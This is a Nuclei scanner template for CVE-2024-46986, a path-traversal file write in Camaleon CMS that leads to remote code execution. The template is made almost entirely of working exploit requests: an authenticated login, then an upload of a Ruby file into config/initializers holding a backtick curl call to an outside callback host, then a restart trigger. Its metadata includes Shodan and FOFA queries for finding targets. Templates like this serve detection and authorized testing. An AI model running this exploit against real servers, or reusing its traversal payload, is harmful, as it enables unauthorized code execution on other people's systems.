flow: http(1) && http(2) && http(3) && http(4)
http:
- extractors:
  - group: 1
    internal: true
    name: nonce
    part: body
    regex:
    - name="authenticity_token" value="(.*?)"
    type: regex
  raw:
  - 'GET /admin/login HTTP/1.1

    Host: {{Hostname}}

    '
- matchers:
  - dsl:
    - contains(location,"/admin/dashboard")
    internal: true
    type: dsl
  raw:
  - 'POST /admin/login HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/x-www-form-urlencoded

    Connection: keep-alive


    authenticity_token={{nonce}}&user%5Busername%5D={{username}}&user%5Bpassword%5D={{password}}

    '
- matchers:
  - internal: true
    part: body
    type: word
    words:
    - '{"name":"{{filename}}.rb","folder_path":"../../../config/initializers"'
  raw:
  - 'POST /admin/media/upload?actions=false HTTP/1.1

    Host: {{Hostname}}

    Content-Type: multipart/form-data;boundary=----WebKitFormBoundarynJs8ffRP2MgQXiF8


    ------WebKitFormBoundarynJs8ffRP2MgQXiF8

    Content-Disposition: form-data; name="file_upload"; filename="{{filename}}.rb"

    Content-Type: text/x-ruby-script


    `curl {{interactsh-url}}`

    ------WebKitFormBoundarynJs8ffRP2MgQXiF8

    Content-Disposition: form-data; name="folder"


    ../../../config/initializers/

    ------WebKitFormBoundarynJs8ffRP2MgQXiF8

    Content-Disposition: form-data; name="skip_auto_crop"


    true

    ------WebKitFormBoundarynJs8ffRP2MgQXiF8--

    '
- matchers:
  - part: interactsh_protocol
    type: word
    words:
    - dns
  - part: body
    type: word
    words:
    - '{"name":"restart.txt","folder_path":"../../../tmp"'
  matchers-condition: and
  raw:
  - 'POST /admin/media/upload?actions=false HTTP/1.1

    Host: {{Hostname}}

    Content-Type: multipart/form-data;boundary=----WebKitFormBoundarynJs8ffRP2MgQXiF8


    ------WebKitFormBoundarynJs8ffRP2MgQXiF8

    Content-Disposition: form-data; name="file_upload"; filename="restart.txt"

    Content-Type: text/x-ruby-script


    {{randstr}}

    ------WebKitFormBoundarynJs8ffRP2MgQXiF8

    Content-Disposition: form-data; name="folder"


    ../../../tmp/

    ------WebKitFormBoundarynJs8ffRP2MgQXiF8

    Content-Disposition: form-data; name="skip_auto_crop"


    true

    ------WebKitFormBoundarynJs8ffRP2MgQXiF8--

    '
id: CVE-2024-46986
info:
  author: iamnoooob,rootxharsh,pdresearch
  classification:
    cpe: cpe:2.3:a:tuzitio:camaleon_cms:*:*:*:*:*:*:*:*
    cve-id: CVE-2024-46986
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H
    cvss-score: 9.9
    cwe-id: CWE-22,CWE-74
    epss-percentile: 0.99694
    epss-score: 0.92152
  description: 'An arbitrary file write vulnerability accessible via the upload method
    of the MediaController allows authenticated users to write arbitrary files to
    any location on the web server Camaleon CMS is running on (depending on the permissions
    of the underlying filesystem). E.g. This can lead to a remote code execution in
    case an attacker is able to write a Ruby file into the config/initializers/ subfolder
    of the Ruby on Rails application

    '
  impact: 'Authenticated attackers can write arbitrary files to any location on the
    web server, potentially achieving remote code execution.

    '
  metadata:
    fofa-query: title="Camaleon CMS"
    max-request: 4
    product: camaleon_cms
    shodan-query: title:"Camaleon CMS"
    vendor: tuzitio
    verified: true
  name: Camaleon CMS < 2.8.1 Arbitrary File Write to RCE
  reference:
  - https://github.com/advisories/GHSA-wmjg-vqhv-q5p5
  - https://codeql.github.com/codeql-query-help/ruby/rb-path-injection
  - https://owasp.org/www-community/attacks/Path_Traversal
  - https://github.com/nomi-sec/PoC-in-GitHub
  - https://github.com/fkie-cad/nvd-json-data-feeds
  remediation: 'Update Camaleon CMS to version 2.8.1 or later.

    '
  severity: critical
  tags: cve,cve2024,camaleon,intrusive,rce,file-upload,authenticated,vuln
variables:
  filename: '{{to_lower(rand_text_alpha(12))}}'
  password: '{{password}}'
  username: '{{username}}'
